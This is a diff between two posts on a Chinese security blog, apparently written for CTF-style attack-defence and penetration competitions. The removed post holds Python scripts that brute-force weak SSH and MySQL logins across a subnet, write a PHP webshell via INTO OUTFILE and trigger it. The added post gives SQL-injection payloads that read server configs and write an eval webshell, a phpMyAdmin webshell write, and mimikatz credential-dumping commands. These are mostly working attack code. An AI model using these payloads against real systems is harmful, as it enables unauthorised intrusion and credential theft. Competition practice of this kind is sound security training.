@@ -4,25 +4,25 @@
 <head>
   <meta charset="UTF-8">
   
-    <title>AWD攻击脚本(持续更新) | GetFlag&#39;s Blog</title>
+    <title>综合渗透笔记 (持续更新) | GetFlag&#39;s Blog</title>
     <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
     
     <meta name="author" content="GetFlag">
     
 
     
-    <meta name="description" content="一些很简单漏洞的利用脚本，慢慢积累，持久更新">
-<meta name="keywords" content="AWD,python,攻击脚本">
+    <meta name="description" content="最近学校组织参加西普杯 铁人三项比赛，很久没搞渗透，重新把这一块给拾起来 西普杯铁人三项包括  个人环境竞赛(pwn) 企业环境竞赛(综合渗透) 数据分析对抗(wireshark流量分析)  对其他两项涉足比较少，所以打算在综合渗透上深挖">
+<meta name="keywords" content="综合渗透,铁人三项">
 <meta property="og:type" content="article">
-<meta property="og:title" content="AWD攻击脚本(持续更新)">
-<meta property="og:url" content="http://flag0.com/2018/02/18/AWD攻击脚本/index.html">
+<meta property="og:title" content="综合渗透笔记 (持续更新)">
+<meta property="og:url" content="http://flag0.com/2018/03/19/综合渗透/index.html">
 <meta property="og:site_name" content="GetFlag&#39;s Blog">
-<meta property="og:description" content="一些很简单漏洞的利用脚本，慢慢积累，持久更新">
+<meta property="og:description" content="最近学校组织参加西普杯 铁人三项比赛，很久没搞渗透，重新把这一块给拾起来 西普杯铁人三项包括  个人环境竞赛(pwn) 企业环境竞赛(综合渗透) 数据分析对抗(wireshark流量分析)  对其他两项涉足比较少，所以打算在综合渗透上深挖">
 <meta property="og:locale" content="cn-zh">
-<meta property="og:updated_time" content="2018-03-17T14:31:08.188Z">
+<meta property="og:updated_time" content="2018-03-19T08:04:51.803Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="AWD攻击脚本(持续更新)">
-<meta name="twitter:description" content="一些很简单漏洞的利用脚本，慢慢积累，持久更新">
+<meta name="twitter:title" content="综合渗透笔记 (持续更新)">
+<meta name="twitter:description" content="最近学校组织参加西普杯 铁人三项比赛，很久没搞渗透，重新把这一块给拾起来 西普杯铁人三项包括  个人环境竞赛(pwn) 企业环境竞赛(综合渗透) 数据分析对抗(wireshark流量分析)  对其他两项涉足比较少，所以打算在综合渗透上深挖">
 
     
     <link rel="alternative" href="/atom.xml" title="GetFlag&#39;s Blog" type="application/atom+xml">
@@ -78,14 +78,14 @@
 		<header class="article-info clearfix">
   <h1 itemprop="name">
     
-      <a href="/2018/02/18/AWD攻击脚本/" title="AWD攻击脚本(持续更新)" itemprop="url">AWD攻击脚本(持续更新)</a>
+      <a href="/2018/03/19/综合渗透/" title="综合渗透笔记 (持续更新)" itemprop="url">综合渗透笔记 (持续更新)</a>
   </h1>
   <p class="article-author">By
        
 		<a href="/about" title="GetFlag" target="_blank" itemprop="author">GetFlag</a>
 		
   <p class="article-time">
-    <time datetime="2018-02-18T14:00:03.000Z" itemprop="datePublished"> Published 2018-02-18</time>
+    <time datetime="2018-03-19T08:00:03.000Z" itemprop="datePublished"> Published 2018-03-19</time>
     
   </p>
 </header>
@@ -94,73 +94,37 @@
 		<div id="toc" class="toc-article">
 			<strong class="toc-title">Contents</strong>
 		
-			<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#ssh弱口令"><span class="toc-number">1.</span> <span class="toc-text">ssh弱口令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mysql弱口令"><span class="toc-number">2.</span> <span class="toc-text">mysql弱口令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#webshell利用"><span class="toc-number">3.</span> <span class="toc-text">webshell利用</span></a></li></ol>
+			<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#web拿shell"><span class="toc-number">1.</span> <span class="toc-text">web拿shell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL注入读apache配置文件找网站绝对路径"><span class="toc-number">1.1.</span> <span class="toc-text">SQL注入读apache配置文件找网站绝对路径</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL注入写shell"><span class="toc-number">1.2.</span> <span class="toc-text">SQL注入写shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#phpMyAdmin写shell"><span class="toc-number">1.3.</span> <span class="toc-text">phpMyAdmin写shell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cms拿Webshell"><span class="toc-number">2.</span> <span class="toc-text">cms拿Webshell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#dedecms"><span class="toc-number">2.1.</span> <span class="toc-text">dedecms</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#内网渗透"><span class="toc-number">3.</span> <span class="toc-text">内网渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ssh连接"><span class="toc-number">3.1.</span> <span class="toc-text">ssh连接</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#读取密码"><span class="toc-number">3.2.</span> <span class="toc-text">读取密码</span></a></li></ol></li></ol>
 		
 		</div>
 		
-		<p>一些很简单漏洞的利用脚本，慢慢积累，持久更新</p>
-<a id="more"></a>
-<h2 id="ssh弱口令"><a href="#ssh弱口令" class="headerlink" title="ssh弱口令"></a>ssh弱口令</h2><pre><code>#coding=utf-8
-import paramiko
-
-sshc = paramiko.SSHClient()
-sshc.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-
-host = &quot;172.16.1.&quot;
-
-for i in range(120,131):
-    tag = host+str(i)
-    print tag
-    try:
-        try:
-            sshc.connect(tag,22,&apos;root&apos;,&apos;123456&apos;,timeout=1)
-        except:
-            sshc.connect(tag,22,&apos;admin&apos;,&apos;123456&apos;,timeout=1)
-        print sshc.exec_command(&apos;cat /root/flaginfo*&apos;)[1].readlines()
-    except:
-        print &apos;time out&apos;
-</code></pre><h2 id="mysql弱口令"><a href="#mysql弱口令" class="headerlink" title="mysql弱口令"></a>mysql弱口令</h2><p>mysql读文件</p>
-<pre><code>#coding=utf-8
-import MySQLdb
-host = &apos;172.16.1.&apos;
-for i in range(129,131):
-    tag = host+str(i)
-    print tag+&quot;3306&quot;
-    try:
-        MySQLdb.connect(tag,3306,&apos;root&apos;,&apos;root&apos;,&apos;mysql&apos;,timeout=1)
-        cur = conn.cursor()
-        cur.execute(&quot;select load_file(&apos;/root/flag.txt&apos;)&quot;)
-        print cur.fetchone()
-        cur.close()
-    except:
-        print &apos;MYSQL connect out&apos;
-conn.commit()
-conn.close()
-</code></pre><p>mysql写入一句话木马</p>
-<pre><code>#coding=utf-8
-import MySQLdb
-host = &apos;172.16.1.&apos;
-try:
-    conn = MySQLdb.connect(host=host,port=3306,user=&apos;root&apos;,passwd=&apos;root&apos;,db=&apos;mysql&apos;,connect_timeout=1)
-    cur = conn.cursor()
-    cur.execute(&quot;&quot;&quot;create table sys(cmd text NOT NULL);&quot;&quot;&quot;)
-    cur.execute(&quot;&quot;&quot;insert into sys(cmd)values(&quot;&lt;?php system(&apos;cat /root/flaginfo*&apos;);?&gt;&quot;);&quot;&quot;&quot;)
-    cur.execute(&quot;&quot;&quot;select * from sys into outfile &quot;/val/www/html/sys.php&quot;;&quot;&quot;&quot;)
-    os.system(&quot;curl &quot;+tag+&quot;/sys.php&quot;)
-except:
-    print &apos;Mysql time out&apos;
-</code></pre><h2 id="webshell利用"><a href="#webshell利用" class="headerlink" title="webshell利用"></a>webshell利用</h2><pre><code>#!usr/bin/python
-import urllib,urllib2
-for i in range(1,10):
-    tag = &apos;http://172.16.&apos;+str(i)+&apos;.113/add_book.php&apos;
-    data = {&quot;password&quot;:&quot;system(&apos;cat /flag&apos;);&quot;}
-    print tag
-    try:
-        f = urllib2.urlopen(url=tag,data=urllib.urlencode(data),timeout=1)
-        flag = f.read()
-        print flag[0:40]
-    except:
-        print &apos;time out&apos;
+		<p>最近学校组织参加西普杯 铁人三项比赛，很久没搞渗透，重新把这一块给拾起来</p>
+<p>西普杯铁人三项包括</p>
+<ul>
+<li>个人环境竞赛(pwn)</li>
+<li>企业环境竞赛(综合渗透)</li>
+<li>数据分析对抗(wireshark流量分析)</li>
+</ul>
+<p>对其他两项涉足比较少，所以打算在综合渗透上深挖<br><a id="more"></a></p>
+<h2 id="web拿shell"><a href="#web拿shell" class="headerlink" title="web拿shell"></a>web拿shell</h2><h3 id="SQL注入读apache配置文件找网站绝对路径"><a href="#SQL注入读apache配置文件找网站绝对路径" class="headerlink" title="SQL注入读apache配置文件找网站绝对路径"></a>SQL注入读apache配置文件找网站绝对路径</h3><p>linux下</p>
+<pre><code>http://172.16.1.162/sql/index.php?id=12 UNION SELECT load_file(&quot;/etc/httpd/conf/httpd.conf&quot;),2,3,4,5,6,7,8,9,10
+</code></pre><h3 id="SQL注入写shell"><a href="#SQL注入写shell" class="headerlink" title="SQL注入写shell"></a>SQL注入写shell</h3><pre><code>http://172.16.1.162/sql/index.php?id=12 UNION SELECT   0x223C3F706870206576616C28245F504F53545B636D645D293B203F3E22,2,3,4,5,6,7,8,9,10 into outfile &quot;/var/www/html/uploads/shell.php&quot;
+</code></pre><p>shell一句话木马内容在sql注入中必须进行十六进制转义</p>
+<h3 id="phpMyAdmin写shell"><a href="#phpMyAdmin写shell" class="headerlink" title="phpMyAdmin写shell"></a>phpMyAdmin写shell</h3><pre><code>select &quot;&lt;?php eval($_POST[cmd]); ?&gt;&quot; into outfile &quot;/var/html/www/shell.php&quot;
+</code></pre><h2 id="cms拿Webshell"><a href="#cms拿Webshell" class="headerlink" title="cms拿Webshell"></a>cms拿Webshell</h2><h3 id="dedecms"><a href="#dedecms" class="headerlink" title="dedecms"></a>dedecms</h3><p>后台-&gt;附件管理-&gt;文件管理器-&gt;文件上传</p>
+<h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h2><h3 id="ssh连接"><a href="#ssh连接" class="headerlink" title="ssh连接"></a>ssh连接</h3><pre><code>ssh username@host
+</code></pre><p>上传文件</p>
+<p>上传本地文件到服务器</p>
+<pre><code>scp /path/filename username@host:/path/
+</code></pre><p>从服务器上下载文件</p>
+<pre><code>scp username@host:/path/filename /var/www/local_dir(本地目录)
+</code></pre><p>从服务器上下载整个目录</p>
+<pre><code>scp -r username@host:/var/www/remote_dir/(远程目录) /var/www/local_dir(本地目录)
+</code></pre><p>上传目录到服务器</p>
+<pre><code>scp -r local_dir username@host:remote_dir
+</code></pre><h3 id="读取密码"><a href="#读取密码" class="headerlink" title="读取密码"></a>读取密码</h3><p>mimikatz</p>
+<pre><code>privilege::debug //提权
+sekurlsa::logonpasswords //读取密码
 </code></pre>  
 	</div>
 		<footer class="article-footer clearfix">
@@ -174,7 +138,7 @@ for i in range(1,10):
 
   <div class="article-tags">
   
-  <span></span> <a href="/tags/AWD/">AWD</a><a href="/tags/python/">python</a><a href="/tags/攻击脚本/">攻击脚本</a>
+  <span></span> <a href="/tags/综合渗透/">综合渗透</a><a href="/tags/铁人三项/">铁人三项</a>
   </div>
 
 </div>
@@ -183,7 +147,7 @@ for i in range(1,10):
 
 	<div class="article-share" id="share">
 	
-	  <div data-url="http://flag0.com/2018/02/18/AWD攻击脚本/" data-title="AWD攻击脚本(持续更新) | GetFlag&#39;s Blog" data-tsina="" class="share clearfix">
+	  <div data-url="http://flag0.com/2018/03/19/综合渗透/" data-title="综合渗透笔记 (持续更新) | GetFlag&#39;s Blog" data-tsina="" class="share clearfix">
 	  </div>
 	
 	</div>
@@ -196,14 +160,14 @@ for i in range(1,10):
 	
 <nav class="article-nav clearfix">
  
- <div class="prev" >
- <a href="/2018/02/27/AXMPP安装问题解决/" title="XAMPP Apache shutdown unexpectedly问题解决">
-  <strong>上一篇：</strong><br/>
-  <span>
-  XAMPP Apache shutdown unexpectedly问题解决</span>
+
+<div class="next">
+<a href="/2018/03/17/wireshark-学习笔记/"  title="Wireshark 初接触">
+ <strong>下一篇：</strong><br/> 
+ <span>Wireshark 初接触
+</span>
 </a>
 </div>
-
 
 </nav>
 
@@ -217,7 +181,7 @@ for i in range(1,10):
   <div id="toc" class="toc-aside">
   <strong class="toc-title">Contents</strong>
  
- <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#ssh弱口令"><span class="toc-number">1.</span> <span class="toc-text">ssh弱口令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mysql弱口令"><span class="toc-number">2.</span> <span class="toc-text">mysql弱口令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#webshell利用"><span class="toc-number">3.</span> <span class="toc-text">webshell利用</span></a></li></ol>
+ <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#web拿shell"><span class="toc-number">1.</span> <span class="toc-text">web拿shell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL注入读apache配置文件找网站绝对路径"><span class="toc-number">1.1.</span> <span class="toc-text">SQL注入读apache配置文件找网站绝对路径</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL注入写shell"><span class="toc-number">1.2.</span> <span class="toc-text">SQL注入写shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#phpMyAdmin写shell"><span class="toc-number">1.3.</span> <span class="toc-text">phpMyAdmin写shell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cms拿Webshell"><span class="toc-number">2.</span> <span class="toc-text">cms拿Webshell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#dedecms"><span class="toc-number">2.1.</span> <span class="toc-text">dedecms</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#内网渗透"><span class="toc-number">3.</span> <span class="toc-text">内网渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ssh连接"><span class="toc-number">3.1.</span> <span class="toc-text">ssh连接</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#读取密码"><span class="toc-number">3.2.</span> <span class="toc-text">读取密码</span></a></li></ol></li></ol>
  
   </div>
 
